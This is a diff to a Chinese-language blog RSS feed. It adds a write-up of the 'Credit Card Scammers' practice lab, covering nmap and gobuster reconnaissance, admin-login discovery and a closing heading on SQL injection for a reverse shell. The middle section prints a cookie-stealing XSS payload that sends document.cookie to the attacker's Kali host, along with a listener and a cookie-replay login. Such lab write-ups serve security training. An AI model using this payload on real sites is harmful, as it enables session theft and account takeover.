@@ -147,4 +147,35 @@
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;service networking restart
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="%E8%8E%B7%E5%BE%97.png" alt="获得"&gt;&lt;/p&gt;
 &lt;p&gt;回到 kali 中，重新获得 ip&lt;/p&gt;
-&lt;p&gt;&lt;img src="%E8%8E%B7%E5%BE%97ip.png" alt="获得ip.png"&gt;&lt;/p&gt;</description></item></channel></rss>
+&lt;p&gt;&lt;img src="%E8%8E%B7%E5%BE%97ip.png" alt="获得ip.png"&gt;&lt;/p&gt;</description></item><item><title>Credit Card Scammers Writeup</title><link>https://enilmalus.github.io/posts/credit-card-scammers-writeup/</link><pubDate>Sun, 18 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/credit-card-scammers-writeup/</guid><description>&lt;blockquote&gt;
+&lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id="credit-card-scammers-靶场"&gt;Credit Card Scammers 靶场&lt;/h1&gt;
+&lt;h2 id="服务扫描"&gt;服务扫描&lt;/h2&gt;
+&lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p22,80,443,9090 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="aaa.png" alt="aaa.png"&gt;&lt;/p&gt;
+&lt;h2 id="gobuster-爆破目录"&gt;gobuster 爆破目录&lt;/h2&gt;
+&lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="bbb.png" alt="bbb.png"&gt;&lt;/p&gt;
+&lt;h2 id="web-渗透"&gt;Web 渗透&lt;/h2&gt;
+&lt;p&gt;审计爆破的目录发现在 admin 下有一个登入界面&lt;/p&gt;
+&lt;p&gt;&lt;img src="ccc.png" alt="ccc.png"&gt;&lt;/p&gt;
+&lt;p&gt;默认界面能找到提交表单&lt;/p&gt;
+&lt;p&gt;&lt;img src="ddd.png" alt="ddd.png"&gt;&lt;/p&gt;
+&lt;p&gt;尝试 XSS&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script&amp;gt;new Image().src=&amp;#34;http://10.10.10.5/?c=&amp;#34;+document.cookie;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ee.png" alt="ee.png"&gt;&lt;/p&gt;
+&lt;p&gt;kali 架设连接&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;python3 -m http.server &lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="fff.png" alt="fff.png"&gt;&lt;/p&gt;
+&lt;p&gt;修改 cookie 登入&lt;/p&gt;
+&lt;p&gt;&lt;img src="ggg.png" alt="ggg.png"&gt;&lt;/p&gt;
+&lt;p&gt;注入 sql 反弹 shell&lt;/p&gt;</description></item></channel></rss>
